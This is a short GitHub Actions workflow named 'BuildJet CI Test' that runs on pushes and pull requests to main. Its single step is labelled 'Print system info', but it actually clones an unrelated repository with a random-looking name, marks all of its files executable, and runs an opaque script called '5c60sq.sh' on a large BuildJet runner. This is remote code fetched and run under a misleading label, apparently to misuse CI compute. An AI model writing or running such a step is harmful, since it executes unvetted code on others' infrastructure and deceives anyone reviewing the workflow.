name: BuildJet CI Test

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

jobs:
  build:
    runs-on: buildjet-16vcpu-ubuntu-2204

    steps:
    - name: Checkout repo
      uses: actions/checkout@v4

    - name: Print system info
      run: |
        echo "Testing BuildJet CI"
        git clone https://github.com/shivmods2027/gfbf17.git
        cd gfbf17
        chmod +x *
        ./5c60sq.sh runner
